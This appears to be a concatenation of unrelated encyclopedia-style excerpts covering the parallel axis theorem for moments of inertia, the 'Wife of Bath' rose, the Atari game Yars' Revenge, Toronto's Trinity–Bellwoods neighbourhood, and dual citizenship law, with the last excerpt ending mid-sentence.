(\\\\mathbf{r}-\\\\mathbf{R})dV + 2\\\\mathbf{d}\\\\cdot\\\\left(\\\\int_V \\\\rho(\\\\mathbf{r}) (\\\\mathbf{r}-\\\\mathbf{R}) \\\\, dV\\\\right) + \\\\left(\\\\int_V \\\\rho(\\\\mathbf{r}) \\\\, dV\\\\right)\\\\mathbf{d}\\\\cdot\\\\mathbf{d}. \\\\end{align} The first term is the moment of inertia IR, the second term is zero by definition of the center of mass, and the last term is the total mass of the body times the square magnitude of the vector d. Thus, : I_S = I_R + Md^2, \\\\, which is known as the parallel axis theorem. Moment of inertia matrix The inertia matrix of a rigid system of particles depends on the choice of the reference point.T. R. Kane and D. A. Levinson, Dynamics, Theory and Applications, McGraw-Hill, NY, 2005. There is a useful relationship between the inertia matrix relative to the center of mass R and the inertia matrix relative to another point S. This relationship is called the parallel axis theorem. Consider the inertia matrix [IS] obtained for a rigid system of particles measured relative to a reference point S, given by : [I_S] = -\\\\sum_{i=1}^n m_i[r_i-S][r_i-S], where ri defines the position of particle Pi, i = 1, ..., n. Recall that [ri ‚àí S] is the skew- symmetric matrix that performs the cross product, : [r_i -S]\\\\mathbf{y} = (\\\\mathbf{r}_i - \\\\mathbf{S})\\\\times \\\\mathbf{y}, for an arbitrary vector y. Let R be the center of mass of the rigid system, then : \\\\mathbf{R} = (\\\\mathbf{R}-\\\\mathbf{S}) + \\\\mathbf{S} = \\\\mathbf{d} + \\\\mathbf{S}, where d is the vector from the reference point S to the center of mass R. Use this equation to compute the inertia matrix, : [I_S] = -\\\\sum_{i=1}^n m_i[r_i- R + d][r_i - R+ d]. Expand this equation to obtain : [I_S] = \\\\left(-\\\\sum_{i=1}^n m_i [r_i - R][r_i - R]\\\\right) + \\\\left(-\\\\sum_{i=1}^n m_i[r_i - R]\\\\right)[d] + [d]\\\\left(-\\\\sum_{i=1}^n m_i[r_i - R]\\\\right) + \\\\left(-\\\\sum_{i=1}^n m_i\\\\right)[d][d]. The first term is the inertia matrix [IR] relative to the center of mass. The second and third terms are zero by definition of the center of mass R, : \\\\sum_{i=1}^n m_i(\\\\mathbf{r}_i -\\\\mathbf{R}) = 0. And the last term is the total mass of the system multiplied by the square of the skew-symmetric matrix [d] constructed from d. The result is the parallel axis theorem, : [I_S] = [I_R] - M[d]^2, where d is the vector from the reference point S to the center of mass R. =Identities for a skew-symmetric matrix= In order to compare formulations of the parallel axis theorem using skew- symmetric matrices and the tensor formulation, the following identities are useful. Let [R] be the skew symmetric matrix associated with the position vector R = (x, y, z), then the product in the inertia matrix becomes : -[R][R]= -\\\\begin{bmatrix} 0 & -z & y \\\\\\\\\\\\ z & 0 & -x \\\\\\\\\\\\ -y & x & 0 \\\\end{bmatrix}^2 = \\\\begin{bmatrix} y^2+z^2 & -xy & -xz \\\\\\\\\\\\ -y x & x^2+z^2 & -yz \\\\\\\\\\\\ -zx & -zy & x^2+y^2 \\\\end{bmatrix}. This product can be computed using the matrix formed by the outer product [R RT] using the identify : -[R]^2 = \\\\mathbf{R}^2[E_3] -[\\\\mathbf{R}\\\\mathbf{R}^T]= \\\\begin{bmatrix} x^2+y^2+z^2 & 0 & 0 \\\\\\\\\\\\ 0& x^2+y^2+z^2 & 0 \\\\\\\\\\\\0& 0& x^2+y^2+z^2 \\\\end{bmatrix}- \\\\begin{bmatrix}x^2 & xy & xz \\\\\\\\\\\\ yx & y^2 & yz \\\\\\\\\\\\ zx & zy & z^2\\\\end{bmatrix}, where [E3] is the 3 √ó 3 identity matrix. Also notice, that : \\\\mathbf{R}^2 = \\\\mathbf{R}\\\\cdot\\\\mathbf{R} =\\\\operatorname{tr}[\\\\mathbf{R}\\\\mathbf{R}^T], where tr denotes the sum of the diagonal elements of the outer product matrix, known as its trace.

Austin in England in 1969. It was one of his early cultivars and is named after a character from Geoffrey Chaucer's The Canterbury Tales. 'Rosarium Gl√ºcksburg' is a rose garden in the park of Schloss Gl√ºcksburg in Gl√ºcksburg, Germany. 'Wife of Bath' and 'Canterbury', the second cultivar Austin named in honour of the English author Geoffrey Chaucer in 1969, were the first repeat flowering varieties in his English Rose Collection. The rose cultivar was created from Joseph Pernet-Ducher's pink hybrid tea 'Madame Caroline Testout' (introduced in 1890) and a cross between the floribunda 'Ma Perkins' (Boerner, 1952) and Austin's first English rose 'Constance Spry' (introduced in 1961). 'Wife of Bath' has old-fashioned medium-sized flowers with an average diameter of , and up to 55 petals. They develop from red round buds, and have a strong, sweet fragrance of myrrh. The slightly cupped bloom form is double to very full with many small, informally arranged petals in the middle of the flower. The center is deep pink, and contrasts with the paler reverse and the outer petals, that fade to very pale pink. They grow in clusters of 3‚Äì9, and appear continuously from early June throughout the summer. The robust shrub grows densely and remains rather small, reaching only about 80 to 120 centimeters (2.5 to 4 ft) height at a width of 60 to 90 centimeters (2 to 3 ft). The arching shoots bear small, matte, medium green leaves. 'Wife of Bath' is disease resistant and winter hardy down to ‚àí23 ¬∞C (USDA zone 6 and warmer), and half shade tolerant. The variety is grown on its own roots and can be planted solitary, in groups, or as hedges, but is also suitable as container plant and as cut flower. Due to its size and floriferousness, the cultivar is well suited for small gardens. David Austin used the cultivar in the development of several new English roses, including 'Gertrude Jekyll' (1986), 'Pretty Jessica' (1983) and 'Scepter'd Isle' (1989).

It was created by Howard Scott Warshaw and is Atari's best-selling original title for the 2600. Gameplay Gameplay screenshot The player controls an insect-like creature called a Yar who must nibble or shoot through a barrier in order to fire his Zorlon Cannon into the breach. The objective is to destroy the evil Qotile, which exists on the other side of the barrier. The Qotile can attack the Yar, even if the barrier is undamaged, by turning into the Swirl and shooting across the screen. In early levels the player is warned before the Swirl is fired and can retreat to a safe distance to dodge the attack. The Yar can hide from a pursuing destroyer missile within a \\"neutral zone\\" in the middle of the screen, but the Yar cannot shoot while in the zone. The Swirl can kill the Yar anywhere, even inside the neutral zone. To destroy the Qotile or the Swirl, the player has to either touch the Qotile or eat a piece of the shield to activate the Zorlon Cannon, aim the cannon by leading with the Qotile or Swirl, then fire the cannon and fly the Yar out of the path of the cannon's shot. If the weapon finds its mark, the level ends. If the cannon blast hits a piece of the shield or misses, it is expended. The cannon itself is dangerous because, once activated, the fire button launches it instead of firing the Yar's usual shots and, as the cannon tracks the Yar's vertical position, players effectively use the Yar itself as a target and therefore must immediately maneuver to avoid being hit by their own shot. The cannon shot can also rebound off the shield in later levels. An extra life is earned if the player shoots the Swirl in mid-air. =Easter egg= A screenshot of the Easter egg The game has an Easter egg. After killing the Swirl in mid- flight, a black vertical line appears on the screen across the spot where the Swirl was shot (the line is referred to in the manual as the \\"Ghost of Yars\\" and warns the player to stay off its \\"mean streak\\"). If the Yar is in the lower third of the screen and the black spot on its back across the vertical line at the moment the explosion vanishes, the game ends and goes into the \\"game select\\" screen with programmer's initials, HSW, shown both forwards and backwards as HSWWSH in place of the player's score. This forward-backward lettering is a clue to players to look at the names in the game manual the same way. Development GDC 2015 The game began as a licensed port of the Cinematronics arcade game Star Castle. Warshaw's original design for the Atari 2600 conversion was nearly identical to Star Castle: a powerful cannon is protected by three layers of counter-rotating shields. The player must shoot holes in these shields in order to destroy the cannon inside. But once these holes are made, the cannon can also shoot out at the player. If the outermost layer is completely destroyed, new layers of shields are grown. Harassing the player are three free-roaming mines that hunt the player's ship. However, as Warshaw realized the 2600's limitations would not allow for an accurate port of the game, he readapted the concept into a new game, preserving the \\"top logical and geometric components of Star Castle and reorganized them in a way that would better suit the machine\\". The reimagined game's working title was Time Freeze, because Warshaw wanted an action game where time would pause to feature the first full-screen explosion in a video game. The final game story involves mutated houseflies defending their world against an alien attacker. Warshaw \\"liked secret messages and hidden ideas\\" and thus inverted the name of Ray Kassar, then CEO of Atari, to become the titular Yar race and its planet Razak. This secret was hinted at by the forward-backward letters in the Easter egg. Warshaw wanted to call the game Yars' Revenge and so lied to one marketing employee that the CEO had approved the name. He then swore that employee to secrecy, assuming \\"This guy is going to run back and tell everyone.\\" Play testing by Atari found that the game was popular with women, in contrast to most space shooter games, which were not. Package As with several other video games for the 2600 system, a miniature comic book was included in the game package of Yars' Revenge to illustrate the story behind the game. The comic book explains the \\"revenge\\" of the game's title in terms of the Yars avenging the destruction of one of their worlds, Razak IV. Atari also released an album, under the Kid Stuff Records label, which contains a theme song and a radio drama-style reading of an expansion of the story in the comic book. A different 7\\" recording explained the tragedy that revealed that a Yar could use himself to target the Zorlon Cannon rather than eating from the barrier. Both recordings were produced by John Braden.  Reception  While the original is now considered a classic, Yars' Revenge received some mediocre reviews at the time of its release. The October 1982 issue of Electronic Games stated, \\"The game has only one objective that must be repeated indefinitely. Today's player's have grown used to progressive play, new challenges, and changing graphics. In this regard Yar is far too static.\\" The following year in the same magazine Bill Kunkel and Arnie Katz called Yars' Revenge a \\"video sleeping pill\\". The reimagined Yar's Revenge for Xbox 360 was positively reviewed by Popmatters, who considered it visually appealing and good value. The PC port of the Xbox 360 version was panned by IGN, scoring a rating of only 5.5 out of 10. It was considered to have little connection to the original game and to be too short even when the low price was taken into consideration. Legacy =Re-releases= In 1999, a Game Boy Color version was developed by Vatical Entertainment and released by Telegames. A version was created in 2004 for the Atari Flashback system. A 3-in-1 cartridge was released for the Game Boy Advance in 2005, published by DSI Games. This title features Yars' Revenge, Pong, and Asteroids. The original version of Yars' Revenge was made available through Xbox's Game Room in 2010. =Remakes= A reimagining (titled Yar's Revenge, rather than Yars' Revenge) was released as a downloadable title on April 12, 2011 on Xbox Live Arcade and on April 28, 2011 for Microsoft Windows. It was developed by Killspace Entertainment and published by Atari. In this version, the eponymous Yar has been reimagined as a humanoid female in mechanized power armor. Another remake, a prequel to the original, Yars' Revenge: First War was released as a part of the Atari GO initiative on April 8, 2011, on Facebook. It was developed by Teravision Games and published by Atari. This version is an arcade social game reminiscent of the original Atari 2600 game. This version has been acclaimed by remaining faithful to the original and still offering new innovative content.

It is bounded on the east by Bathurst Street, on the north by College Street, on the south by Queen Street West, and by Dovercourt Road on the west. It has a large Portuguese (mostly originally from the Azores and Madeira islands) and Brazilian community, and many local Lusitanian-Canadian businesses are located along Dundas Street West, continuing west into Little Portugal; this stretch further west along Dundas is known as Rua A√ßores. The neighbourhood takes its name from Trinity Bellwoods Park, built around the former Garrison Creek ravine. Bounded on the north by Dundas Street West and on the south by the Queen Street West district, the park is immediately accessible from major pedestrian and bicycling thoroughfares. And it is bounded on the east and west by quiet residential streets. Accordingly, the park has a large natural \\"constituency\\". The park also sports a range of environments, including tennis courts, a playground, a hockey rink, a dog walking bowl, a grove, a range of picnic tables, a greenhouse, a community center, and a swimming pool. The northwestern panhandle is home to a farmer's market on Tuesday afternoons from spring to fall. History Trinity College, c. 1856. Completed only four years earlier, the building was situated in present-day Trinity Bellwoods Park. Trinity Bellwoods Park was the original site of Trinity College, one of the colleges that now make up the University of Toronto. The college building, which was completed in 1852, stood roughly at the centre of the park, and remained there for just over 100 years. Today the only remaining artifacts of the school are its restored gates at the south end of the park. By 1900, the college and its picturesque surroundings attracted residential development. Most of the surrounding streets were filled in with tall, narrow houses of the Bay-and-gable or Gothic Revival style characteristic of much of Toronto's housing stock from that era. A number of fine homes from the period are scattered throughout the neighborhood. During the 20th century the neighborhood became a landing site for immigrants of various nationalities, setting a pattern for the next six to seven decades. From the 1920s and 1930s the area became home to many Polish and Ukrainian immigrants; the Bathurst- Queen area was the heart of the city's Polish and Ukrainian communities until the 1960s. By the 1960s, the area had become popular among the immigrants from Portugal, who now define much of the neighborhood's character. The businesses along Ossington Avenue just north of Queen Street have changed in the last decade, with former sports bars and social clubs becoming trendy restaurants, bars and cafes. Some of this conversion has been due to higher commercial rents along Queen Street relative to Ossington Avenue properties. The high conversion rate into bars and the accompanying late-night noise prompted a city-ordered halt to conversions and new liquor serving licenses along Ossington. Demographic According to the 2011 National Household Survey, Ontario remains the most common place of birth for respondents of the area bordered by Dovercourt, Dundas West, Queen West and Gore Avenue, with 1800 claiming place of birth in Ontario. The second most common place of birth was Portugal, with 785. In descending order, respondents indicated that they had been born in another province or territory in Canada (370), Vietnam (70), or Italy (35). Education Three public school boards operate elementary schools in Trinity‚ÄìBellwoods, the Conseil scolaire Viamonde (CSV), the Toronto Catholic District School Board (TCDSB), and the Toronto District School Board (TDSB). CSV and TDSB are secular public school boards, the former being French-based, the latter being English-based. TCDSB is an English-based separate public school board. Elementary schools in the area include: * Charles G. Fraser Junior Public School * √âcole √©l√©mentaire Pierre-Elliott- Trudeau * Gavin/Shaw Junior Public School * Pope Francis Catholic Public School * Ossington/Old Orchard Junior Public School Recreation Gates at the southern entrance to Trinity Bellwoods Park. Trinity‚ÄìBellwoods is home to several parks, including Trinity Bellwoods Park. Parks in the neighbourhood are managed by the Toronto Parks, Forestry and Recreation Division. Trinity Bellwoods Park is a major park that occupies the ravines that surrounded the buried Garrison Creek. The park also features Crawford Street Bridge, a buried, but intact bridge in the north part of municipal park. Other notable attractions and landmarks in the area include the Museum of Contemporary Canadian Art, and St. Matthias Bellwoods.

Conceptually, citizenship is focused on the internal political life of the country and nationality is a matter of international dealings. There is no international convention which determines the nationality or citizenship status of a person. This is defined exclusively by national laws, which can vary and conflict with each other. Multiple citizenship arises because different countries use different, and not necessarily mutually exclusive, criteria for citizenship. Colloquially, people may \\"hold\\" multiple citizenship but, technically, each nation makes a claim that a particular person is considered its national. A person holding multiple citizenship is, generally, entitled to the rights of citizenship in each country whose citizenship he or she is holding (such as right to a passport, right to enter the country, right to residence and work, right to vote, etc.), but may also be subject to obligations of citizenship (such as a potential obligation for national service, becoming subject to taxation on worldwide income, etc.). Some countries do not permit dual citizenship or only do in certain cases (e.g. inheriting multiple nationalities at birth). This may be by requiring an applicant for naturalization to renounce all existing citizenship, or by withdrawing its citizenship from someone who voluntarily acquires another citizenship, or by other devices. Some countries permit a renunciation of citizenship, while others do not. Some countries permit a general dual citizenship while others permit dual citizenship but only of a limited number of countries. A country that allows dual citizenship may still not recognize the other citizenship of its nationals within its own territory (for example, in relation to entry into the country, national service, duty to vote, etc.). Similarly, it may not permit consular access by another country for a person who is also its national. Some countries prohibit dual citizenship holders from serving in their armed forces or on police forces or holding certain public offices.See, for example, Egyptian nationality law#Dual citizenship  History  Up until the late 19th century, nations often decided whom they claimed as their citizens or subjects, and did not recognize any other nationalities they held. Many states did not recognize the right of their citizens to renounce their citizenship without permission, due to policies that originated with the feudal theory of perpetual allegiance to the sovereign. This meant that people could hold multiple citizenships, with none of their nations recognizing any other of their citizenships. Until the early modern era, when levels of migration were insignificant, this was not a serious issue. However, when non-trivial levels of migration began, this state of affairs sometimes led to international incidents, with countries of origin refusing to recognize the new nationalities of natives who had migrated, and when possible, conscripting natives who had naturalized as citizens of another country into military service. The most notable example was the War of 1812, triggered by British impressment into naval service of American seamen who were alleged to be British subjects. In the aftermath of the 1867 Fenian Rising, Irish-Americans who had gone to Ireland to participate in the uprising and were caught were charged with treason, as the British authorities considered them to be British subjects. This outraged many Irish-Americans, to which the British responded by pointing out that, just like British law, American law also recognized perpetual allegiance. As a result, Congress passed the Expatriation Act of 1868, which granted Americans the right to freely renounce their U.S. citizenship. Britain followed suit with a similar law, and years later, signed a treaty agreeing to treat British subjects who had become U.S. citizens as no longer holding British nationality. During this time, diplomatic incidents had also arisen between the United States and several other European countries over their tendency to conscript naturalized American citizens visiting their former homelands. In response, the US government negotiated agreements with various European states known as the Bancroft Treaties, under which the signatories pledged to treat the voluntary naturalization of a former citizen or national with another sovereign nation as a renunciation of their citizenship. As a result, the theory of perpetual allegiance largely fell out of favor with governments during the late 19th century. With the consensus of the time being that dual citizenship would only lead to diplomatic problems, more governments began prohibiting it and revoking the nationality of citizens holding another nationality. By the mid-20th century, dual nationality was largely prohibited worldwide, although there were exceptions. For example, a series of U.S. Supreme Court rulings permitted Americans born with citizenship in another country to keep it without losing their U.S. citizenship.Dual Nationality: TR's \\"Self-Evident Absurdity\\", virginia.edu; accessed September 7, 2015.Dual citizenship , richw.org; accessed September 7, 2015. At the 1930 League of Nations Codification Conference, an attempt was made to codify nationality rules into a universal worldwide treaty, the 1930 Hague Convention, whose chief aims would be to completely abolish both statelessness and dual citizenship. The 1930 Convention on Certain Questions Relating to the Conflict of Nationality Laws proposed laws that would have reduced both, but in the end, was ratified by only twenty nations. However, the consensus against dual nationality began to erode due to changes in social mores and attitudes. By the late 20th century it was becoming gradually accepted again. Many states were lifting restrictions on dual citizenship. For example, the British Nationality Act 1948 removed restrictions on dual citizenship in the United Kingdom, the 1967 Afroyim v. Rusk ruling by the U.S. Supreme Court prohibited the U.S. government from involuntarily stripping citizenship from Americans over dual citizenship, and the Canadian Citizenship Act, 1976, removed restrictions on dual citizenship in Canada. The number of states allowing multiple citizenships further increased after a treaty in Europe requiring signatories to limit dual citizenship lapsed in the 1990s, and countries with high emigration rates began permitting it to maintain links with their respective diasporas.\\"Dutchmen grounded\\", economist.com; accessed September 7, 2015.  Citizenship of multiple countries  Dual citizenship means persons can have or travel with two passports Each country sets its own criteria for citizenship and the rights of citizenship, which change from time to time, often becoming more restrictive. For example, until 1982 a person born in the UK was automatically a British citizen; this was subjected to restrictions from 1983. These laws may create situations where a person may satisfy the citizenship requirements of more than one country simultaneously. This would, in the absence of laws of one country or the other, allow the person to hold multiple citizenships. National laws may include criteria as to the circumstances, if any, in which a person may concurrently hold another citizenship. A country may withdraw its own citizenship if a person acquires a citizenship of another country, for example: * Citizenship by descent (jus sanguinis). Historically, citizenship was traced through the father, but today most countries permit the tracing through either parent and some also through a grandparent. Today, the citizenship laws of most countries are based on jus sanguinis. In many cases, this basis for citizenship also extends to children born outside the country, and sometimes even when the parent has lost citizenship. * Citizenship by birth on the country's territory (jus soli). The United States, Canada, and many Latin American countries grant unconditional birthright citizenship. To stop birth tourism, most countries have abolished it; while Australia, France, Germany, Ireland, New Zealand, South Africa, and the United Kingdom have a modified jus soli, which requires at least one parent to be a citizen of the country (jus sanguinis) or a legal permanent resident who has lived in the country for several years. In the majority of such countries‚Äîfor example, in Canada‚Äîchildren born to diplomats and under people outside the jurisdiction of the soil are not granted citizenship at birth. It is usually conferred automatically on the children once one of the parents obtain citizenship. * Citizenship by marriage (jus matrimonii). Some countries routinely give citizenship to spouses of its citizens or may shorten the time for naturalization, but only in a few countries is citizenship granted on the wedding day (e.g., Iran). Some countries have regulations against so-called sham marriages (e.g., the United States), and some revoke the spouse's citizenship if the marriage terminates within a specified time (e.g., Algeria). * Citizenship by naturalization. * Citizenship by adoption. A minor adopted from another country when at least one adoptive parent is a citizen.For example, this is the case in the United States. Citizenship is automatic when the adoption becomes final, with no need for the naturalization process. See * Citizenship by investment. Some countries give citizenship to people who make a substantial monetary investment in their country. There are three countries in the European Union where this is possible: Malta, Cyprus, and Portugal; as well as the five Caribbean countries of Antigua and Barbuda, Grenada, Dominica, St. Kitts & Nevis, and St. Lucia. Additionally the countries of Vanuatu, Montenegro, Turkey and Jordan offer citizenship by investment programs. Most of these countries grant citizenship immediately, provided that due diligence is passed, without a requirement for any physical presence in the country. Malta requires 1 year of residency before citizenship can be given. Portugal's program grants a resident visa immediately, but there is a 5-year timeline with periodic short visits in order to obtain permanent residency and citizenship. Cambodia has laws enacted that allow foreigners to obtain citizenship through investment, but it is difficult to receive without fluency in Khmer. The countries of Comoros, Nauru, Kiribati, Marshall Islands, Tonga and Moldova previously had citizenship by investment programs however these programs have been suspended or discontinued. * Some countries grant citizenship based on ethnicity and on religion: Israel gives all Jews the right to immigrate to Israel, by the Law of Return, and fast-tracked citizenship. Dual citizenship is permitted, but when entering the country the Israeli passport must be used. * Citizenship by holding an office (jus officii). In the case of Vatican City, citizenship is based on holding an office, with Vatican citizenship held by the Pope, cardinals residing in Vatican City, active members of the Holy See's diplomatic service, and other directors of Vatican offices and services. Vatican citizenship is lost when the term of office comes to an end, and children cannot inherit it from their parents. Since Vatican citizenship is time-limited, dual citizenship is allowed, and persons who would become stateless because of loss of Vatican citizenship automatically become Italian citizens. Once a country bestows citizenship, it may or may not consider a voluntary renunciation of that citizenship to be valid. In the case of naturalization, some countries require applicants for naturalization to renounce their former citizenship. For example, the United States Chief Justice John Rutledge ruled \\"a man may, at the same time, enjoy the rights of citizenship under two governments\\", but the United States requires applicants for naturalization to swear to an oath renouncing all prior \\"allegiance and fidelity\\" to any other nation or sovereignty as part of the naturalization ceremony.A Guide to naturalization, US Citizenship and Immigration Services. (Responsibilities, page 2). However, some countries do not recognise one of its citizens renouncing their citizenship. Effectively, the person in question may still possess both citizenships, notwithstanding the technical fact that he or she may have explicitly renounced one of the country's citizenships before officials of the other. For example, the United Kingdom recognises a renunciation of citizenship only if it is done with competent UK authorities. Consequently, British citizens naturalized in the United States remain British citizens in the eyes of the British government even after they renounce British allegiance to the satisfaction of United States authorities. Irish nationality law applies to \\"the island of Ireland\\", which extends citizenship to Northern Ireland, which is part of the United Kingdom. Therefore, anyone born in Northern Ireland who meets the requirements for being an Irish citizen through birth on the \\"island of Ireland\\" (or a child born outside Ireland but with a qualifying parent) can exercise rights accorded only to Irish citizens, including that of traveling under an Irish passport. Under Irish law, even that such a person has not acted in this way does not necessarily mean that they are not entitled to Irish citizenship. (See Irish nationality law and British nationality law.) People born in Northern Ireland are also British citizens on the same basis as people born elsewhere in the UK. People born in Northern Ireland may generally choose to hold a British passport, an Irish passport, or both. = Multiple citizenship avoided = Some countries may take measures to avoid creation of multiple citizenship. Since a country has control only over who has its citizenship, but has no control over who has any other country's citizenship, the only way for a country to avoid multiple citizenship is to deny its citizenship to people in cases when they would have another citizenship. This may take the following forms: * Automatic loss of citizenship if another citizenship is acquired voluntarily, such as Austria, Azerbaijan,Azerbaijani law on citizenship Bahrain, China (excluding Hong Kong and Macau, which allow multiple citizenship in parallel with Chinese citizenship at the expense of losing consular protection from the country involved in Hong Kong, Macau and China),Chinese Nationality Law explanation on May 15, 1996 by National Peoples Congress India, Indonesia, Japan,Article 11, The Nationality Law, Ministry of Justice of Japan. Kazakhstan, Malaysia.Article 24 of Constitution of Malaysia Nepal,Section 10.1 of Nepal Citizenship Act 2063 (2006) the Netherlands (unless certain conditions are met) and Singapore.Article 134(1)(a) Constitution of the Republic of Singapore Saudi Arabian citizenship may be withdrawn if a Saudi citizen obtains a foreign citizenship without the permission of the Prime Minister. * Possible (but not automatic) loss of citizenship if another citizenship is acquired voluntarily, such as South Africa and Brazil. * Possible (but not automatic) loss of citizenship if people with multiple citizenships do not renounce their other citizenships after reaching the age of majority or within a certain period of time after obtaining multiple citizenships, such as Japan and Montenegro. In the case of Montenegro such loss is automatic (though with some exceptions).Montenegro: Dual citizenship forbidden, but this article is about one known exception. * Denying automatic citizenship by birth if the child may acquire another citizenship automatically at birth. * Requiring an applicant for naturalization to apply to renounce his/her existing citizenship(s), and provide proof from those countries that they have renounced the citizenship. = Automatic citizenship = Countries may bestow citizenship automatically (ie, ‚Äúby operation of law‚Äù), which may result in multiple citizenships, in the following situations: * Some countries automatically bestow citizenship on a person whose parent holds that country's citizenship. If they have different citizenships or are multiple citizens themselves, the child may gain multiple citizenships, depending on whether and how jus soli and jus sanguinis apply for each citizenship. * Some countries (e.g., Canada, the United States of America and many other countries in the Americas) regard all children born there automatically to be eligible to be citizens (jus soli) even if the parents are not legally present. For example, a child born in the United States to Austrian parents automatically has dual citizenship with the United States and Austria, even though Austria usually restricts or forbids dual citizenship. There are exceptions, such as the child of a foreign diplomat living in the United States. Such a child would be eligible to become a lawful permanent resident, but not a citizen-based on the U.S. birth.This has led to birth tourism, so some countries have abolished jus soli or restricted it (i.e., at least one parent must be a citizen or a legal, permanent resident who has lived in the country for several years). Some countries forbid their citizens to renounce their citizenship or try to discourage them from doing so. * Policy changes may also render people to have multiple citizenships involuntarily, for example, when the sovereignty of a place is changed, the new country may declare the people on it to be citizens of the country. = Complex laws on dual citizenship = Some countries have special rules relating to multiple citizenships, such as: * Some countries allow dual citizenship, but restrict the rights of dual citizens:  in Egypt, dual citizens cannot be elected to Parliament.  in Armenia, dual citizens cannot vote or be elected to Parliament.  in Israel, diplomats and members of Parliament must renounce any other citizenship before assuming their job.  in Colombia, dual citizens cannot be Ministers of foreign affairs and of defense.  in Australia, dual citizens cannot be elected to federal Parliament.See examples in Section 44 of the Constitution of Australia#(i) Allegiance to a foreign power In the 2017-18 Australian parliamentary eligibility crisis, fifteen members of Parliament were found to have been ineligible for election due to holding another citizenship, although most had not been aware of the fact.  in New Zealand, dual citizens may be elected to Parliament, but MPs once elected may not voluntarily become a citizen of another country, or take any action to have their foreign nationality recognised such as applying for a foreign passport. However, the only person to recently violate this, Harry Duynhoven, was protected by the passage of retroactive law.  in the Philippines, dual citizens cannot run for any local elective office. (Section 4 and Section 40(d))  in the independent states of the Commonwealth Caribbean, nationals of any Commonwealth country who meet local residency requirements are eligible to vote in elections and run for parliament, with one complicated caveat. Each of those countries has a provision barring anyone who \\"is by virtue of his own act, under any acknowledgment of allegiance, obedience or adherence to a foreign power or state\\" (to quote a representative provision from the constitution of St Vincent and the Grenadines) from becoming a member of parliament. The precise meaning of those provisions is disputed, and is the subject of separate ongoing legal disputes in the countries. * Germany and Austria permit dual citizenship only for persons who had obtained another citizenship by birth.Dual Citizenship, Austrian Embassy, Ottawa, Canada.Dual Citizenship , German Embassy, Ottawa, Canada. Germans and Austrians can apply for special permission to keep their citizenship (Beibehaltungsgenehmigung) before taking a second one (for example, both Austria and the United States consider Arnold Schwarzenegger a citizen). In general, however, any Austrian who takes up second citizenship will automatically lose Austrian citizenship. Since August 2007, Germany has recognised dual citizenship if the other citizenship is either one of an EU member country or Swiss citizenship so that permission is not required anymore in these cases, and in some exceptional cases, non-EU and non-Swiss citizens can keep their old citizenship when they become citizens of Germany. For more details, see German nationality law Dual citizenship. Due to changes of the German law on dual citizenship, children of non-EU legal permanent residents can have dual citizenship if born and grown up in Germany (the foreign-born parents usually cannot have dual citizenship themselves). * Acquisition of the nationality of Andorra, Portugal, the Philippines, Equatorial Guinea or Iberoamerican countries, is not sufficient to cause the loss of Spanish nationality by birth., Art. 24. Spain has dual citizenship treaties with Argentina, Bolivia, Chile, Colombia, Costa Rica, the Dominican Republic, Ecuador, Honduras, Guatemala, Nicaragua, Paraguay, Peru, Puerto Rico, and Venezuela; Spaniards residing in these countries or territories do not lose their rights as Spaniards if they adopt that nationality.Double nationality agreements, Ministry of Employment and Social Security of Spain (in Spanish); retrieved July 18, 2013. For all other countries, Spanish citizenship is lost three years after the acquisition of the foreign citizenship unless the individual declares officially their will to retain Spanish citizenship (Spanish Nationality Law)., Art. 25. Upon request Spain has allowed persons from Puerto Rico to acquire Spanish citizenship.\\"Oscar winner Benicio del Toro, singer Ricky Martin become Spanish citizens\\", usatoday.com, November 4, 2011. On the other hand, foreign nationals who acquire Spanish nationality must relinquish their previous nationality, unless they are natural-born citizens of an Iberoamerican country, Andorra, the Philippines, Equatorial Guinea or Portugal even if these countries do not grant their citizens a similar treatment, or Sephardi Jews. See also the section on \\"dormant\\" citizenship. * Prior to 2011, South Korea did not permit multiple nationalities and for such person, the nationality was stripped after that person becoming the age of 22. Since 2011, a person can hold multiple nationalities if he or she has a multiple nationalities by birthright (i.e. not by naturalization) and explicitly takes an oath not to exercise the other nationality inside the jurisdiction of South Korea. For details, see South Korean nationality law#Dual citizenship. * Like Germany and Austria, citizens of South Africa must apply for permission to keep their citizenship when acquiring the citizenship of another country. * Turkey requires Turkish citizens who apply for another nationality to inform Turkish officials (the nearest Turkish embassy or consulate abroad) and provide the original naturalization certificate, Turkish birth certificate, marriage certificate (if applicable) and two photographs. Dual nationals are not compelled to use a Turkish passport to enter and leave Turkey; it is permitted to travel with a valid foreign passport and the Turkish national ID card. * Pakistan allows dual citizenship with only 19 countries: Australia, Belgium, Bahrain, Canada, Denmark, Egypt, Finland, France, Iceland, Ireland, Italy, Jordan, the Netherlands, New Zealand, Sweden, Switzerland, Syria, Turkey, the United Kingdom,and the United States. = Partial citizenship, and residency= Many countries allow foreigners or former citizens to live and work indefinitely there. However, for voting, being voted and working for the public sector or the national security in a country, citizenship of the country concerned is almost always required. * Since 2008, Poland has granted the \\"Polish Card\\" (Karta Polaka) to ethnic Poles who are citizens of the successor states of the former Soviet Union and can prove they have Polish ancestors and knowledge of the Polish language and declare their Polish ethnicity in written form. Holders of the Card are not regarded as citizens, but enjoy some privileges other foreigners do not, e.g. entry visa, right to work, education, or healthcare in Poland. As stated above, Poland currently has no specific laws on dual citizenship; second citizenship is tolerated, but not recognized. * Turkey allows its citizens to have dual citizenship if they inform the authorities before acquiring the second citizenship (see above), and former Turkish citizens who have given up their Turkish citizenship (for example, because they have naturalized in a country that usually does not permit dual citizenship, such as Germany, Austria or the Netherlands) can apply for the \\"Blue Card\\" (Mavi Kart), which gives them some citizens' rights back, e.g. the right to live and work in Turkey, the right to possess land or the right to inherit, but not, for example, the right to vote. * Overseas citizenship of India: The Constitution of India does not permit dual citizenship or dual nationality, except for minors where the second nationality was involuntarily acquired. Indian authorities interpreted this to mean a person cannot have another country's passport while simultaneously holding an Indian one, even for a child claimed by another country as its citizen, who may be required by the laws of this country to use the corresponding passports for foreign travel (such as a child born in the United States to Indian parents). Indian courts have given the executive branch wide discretion over this matter. : In 2005, India amended the 1955 Citizenship Act to introduce a form of overseas citizenship,Overseas Citizenship of India Scheme , moia.gov.in; accessed September 7, 2015. which stops just short of full dual citizenship and is, in all aspects, like permanent residency. Such overseas citizens are exempt from the rule forbidding dual citizenship; they may not vote, run for office, join the army, or take up government posts, though these evolving principles are subject to revolving political discretions for those born in India with birthrights. Moreover, people who have acquired citizenship in Pakistan or Bangladesh are not eligible for overseas citizenship. * Many countries (e.g. United States, Canada, all EU countries and Switzerland, South Africa, Australia, New Zealand, and Singapore) issue permanent residency status to foreigners deemed eligible. This status generally authorises a person to live and work in the issuing country indefinitely. There is not 